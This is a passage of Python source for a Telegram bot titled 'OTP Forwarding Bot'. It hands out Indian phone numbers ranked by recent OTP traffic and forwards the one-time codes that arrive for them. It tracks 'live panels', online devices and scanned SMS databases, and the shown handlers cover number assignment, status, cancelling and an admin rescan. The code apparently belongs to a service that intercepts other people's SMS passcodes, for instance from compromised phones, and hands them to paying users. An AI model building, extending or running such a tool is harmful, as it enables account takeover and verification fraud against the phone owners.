            f"💀 Dead/Idle Numbers ({len(dead)})\n\nNo recent OTP activity.\nTap to assign anyway 👇",
            reply_markup=live_number_keyboard(dead[:50], page=0))

    # ── TOP NUMBERS ──
    elif data == "topnums":
        if not is_admin: return
        top = get_top_numbers(20)
        if not top:
            await query.edit_message_text("No numbers yet.", reply_markup=back_keyboard())
            return
        await query.edit_message_text(
            f"📈 Top Numbers by Score\n\nTap to assign 👇",
            reply_markup=live_number_keyboard(top, page=0))

    # ── PAGE NAVIGATION ──
    elif data.startswith("lpage_"):
        page = int(data.split("_")[1])
        available = [(n, NUMBER_PROFILES[n]) for n in _live_ranking if NUMBER_PROFILES[n].assigned_to is None]
        await query.edit_message_text(
            f"📱 Numbers (Page {page+1})\n\nTap to assign 👇",
            reply_markup=live_number_keyboard(available, page=page))

    # ── PICK NUMBER ──
    elif data.startswith("pick_"):
        num = data.split("_")[1]
        if uid in USER_WAITING:
            cur = USER_WAITING[uid]
            await query.edit_message_text(
                f"⏳ Already waiting for +91{cur}. Cancel first.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("❌ Cancel Current", callback_data="cancel")],
                    [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
                ]))
            return

        if num not in NUMBER_PROFILES or NUMBER_PROFILES[num].assigned_to is not None:
            await query.edit_message_text("❌ Number no longer available. Pick another.",
                                           reply_markup=InlineKeyboardMarkup([
                                               [InlineKeyboardButton("🔥 Get Live Number", callback_data="get")],
                                               [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
                                           ]))
            return

        prof = NUMBER_PROFILES[num]
        prof.assigned_to = uid
        USER_WAITING[uid] = num
        USER_WAIT_TIME[uid] = time.time()
        logger.info(f"📋 User {uid} picked number +91{num} (score={prof.score:.1f}, live={prof.is_live})")
        logger.info(f"📋 USER_WAITING now: {dict(USER_WAITING)}")

        devs = NUM_TO_DEVICES.get(num, [])
        online_panels = sum(1 for d in devs if d.status == "online")
        emoji = prof.live_status_emoji
        status_text = {
            "🔥": "🔥 HOT!",
            "🟢": "🟢 LIVE!",
            "🟡": "🟡 WARM",
            "🟠": "🟠 COOLING",
            "💀": "💀 IDLE"
        }.get(emoji, "Unknown")

        await query.edit_message_text(
            f"📱 Number Assigned!\n\n"
            f"Number: +91{num}\n"
            f"{status_text}\n"
            f"📊 Score: {prof.score:.0f}\n"
            f"📈 Recent OTPs (5m): {prof.recent_otp_count}\n"
            f"💻 Live Panels: {online_panels}\n\n"
            f"⚡ Watching for OTP...",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔍 Check Status", callback_data="my"),
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
            ]))

    elif data == "none":
        await query.answer("❌ This number is busy (assigned to another user)", show_alert=True)

    # ── MY STATUS ──
    elif data == "my":
        if uid in USER_WAITING:
            num = USER_WAITING[uid]
            prof = NUMBER_PROFILES.get(num)
            elapsed = time.time() - USER_WAIT_TIME.get(uid, time.time())
            remaining = max(0, AUTO_TIMEOUT - elapsed)
            if prof:
                emoji = prof.live_status_emoji
                status_text = {
                    "🔥": "🔥 HOT - OTP just now!",
                    "🟢": "🟢 LIVE",
                    "🟡": "🟡 WARM",
                    "🟠": "🟠 COOLING",
                    "💀": "💀 IDLE"
                }.get(emoji, "Unknown")
                await query.edit_message_text(
                    f"⏳ Waiting for OTP\n\n"
                    f"📱 Number: +91{num}\n"
                    f"{status_text}\n"
                    f"📊 Score: {prof.score:.0f}\n"
                    f"📈 Recent OTPs (5m): {prof.recent_otp_count}\n"
                    f"⏱ Time remaining: {int(remaining)}s\n\n"
                    f"⚡ Watching...",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
                        [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
                    ]))
        else:
            await query.edit_message_text(
                "❌ No active waiting.\nGet a number first 👇",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔥 Get Live Number", callback_data="get")],
                    [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
                ]))

    # ── CANCEL ──
    elif data == "cancel":
        if uid in USER_WAITING:
            num = USER_WAITING.pop(uid)
            USER_WAIT_TIME.pop(uid, None)
            if num in NUMBER_PROFILES:
                NUMBER_PROFILES[num].assigned_to = None
            await query.edit_message_text(
                f"✅ Cancelled waiting for +91{num}",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔥 Get Live Number", callback_data="get")],
                    [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
                ]))
        else:
            await query.edit_message_text("Nothing to cancel.",
                                           reply_markup=back_keyboard())

    # ── STATUS (ADMIN) ──
    elif data == "status":
        if not is_admin: return
        online_devs = sum(1 for d in ALL_DEVICES if d.status == "online")
        live_count = sum(1 for p in NUMBER_PROFILES.values() if p.is_live)
        dead_count = len(NUMBER_PROFILES) - live_count
        in_use = sum(1 for p in NUMBER_PROFILES.values() if p.assigned_to is not None)
        avail = len(NUMBER_PROFILES) - in_use
        top = get_top_numbers(5)
        top_str = "\n".join([f"  {p.live_status_emoji} +91{n} (S:{p.score:.0f}, OTPs:{p.recent_otp_count})" for n, p in top])
        scan_status = "✅ Ready" if _initial_sms_scan_done else "⏳ Initial scan..."
        cooldown_status = "⏳ Cooldown" if is_in_cooldown() else "✅ Full speed"
        await query.edit_message_text(
            f"📊 System Status\n\n"
            f"💻 Devices: {online_devs} online / {len(ALL_DEVICES)} total\n"
            f"📱 Numbers: {len(NUMBER_PROFILES)}\n"
            f"🔥 Live: {live_count} | 💀 Dead: {dead_count}\n"
            f"✅ Available: {avail} | 🔒 In Use: {in_use}\n"
            f"👥 Users Waiting: {len(USER_WAITING)}\n"
            f"📩 SMS Seen: {len(SEEN_SMS)}\n"
            f"🔒 OTP Dedup: {_len_otp_dedup()}\n"
            f"🔍 Scan: {scan_status}\n"
            f"🚀 Mode: {cooldown_status}\n\n"
            f"🏆 Top Numbers:\n{top_str}",
            reply_markup=back_keyboard())

    # ── RESCAN (ADMIN) ──
    elif data == "rescan":
        if not is_admin: return
        await query.edit_message_text("🔄 Starting rescan... (scores preserved)",
                                       reply_markup=back_keyboard())
        asyncio.create_task(scan_all_databases())

# ── START COMMAND ─────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if uid not in _allowed_users:
        await update.message.reply_text("⛔ Not authorized. Contact admin.")
        return
    if not _scan_done:
        await update.message.reply_text("⏳ System scanning... Please wait.",
                                         reply_markup=back_keyboard())
        return
    live_count = sum(1 for p in NUMBER_PROFILES.values() if p.is_live)
    avail = sum(1 for n, p in NUMBER_PROFILES.items() if p.assigned_to is None)
    is_admin = (uid == ADMIN_ID)
    scan_status = "✅ Ready" if _initial_sms_scan_done else "⏳ Initial SMS scan in progress..."
    await update.message.reply_text(
        f"🤖 OTP Forwarding Bot\n\n"
        f"🔥 Live Numbers: {live_count}\n"
        f"📱 Available: {avail}\n"
        f"👥 Waiting: {len(USER_WAITING)}\n"
        f"📈 Total Numbers: {len(NUMBER_PROFILES)}\n"
        f"🔍 Status: {scan_status}\n\n"
        f"Tap a button below 👇",
        reply_markup=main_keyboard(is_admin))

# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    global _app
    print("=" * 50)
    print("  🔑 OTP BOT - ADVANCED LIVE NUMBER SYSTEM v3.2")
    print("=" * 50)
    print(f"Admin: {ADMIN_ID}")
    print(f"Databases: {len(DATABASES)}")
    print(f"Direct Connection (No Proxy)")
    print(f"Live scoring + Smart assignment + Anti-inflation v3.2")
    print(f"Per-path dedup + OTP code dedup + Burst detection + Cooldown")
    print()

    app = Application.builder().token(TOKEN).build()
    _app = app

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(handle_callback))

    async def post_init(application):
        await application.bot.delete_webhook(drop_pending_updates=True)
        await send_admin("🔑 OTP Bot v3.2 starting! Scanning databases & pre-seeding SMS...")
        await scan_all_databases()
        await initial_sms_scan()
        await asyncio.sleep(3)
        asyncio.create_task(background_monitor_loop())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
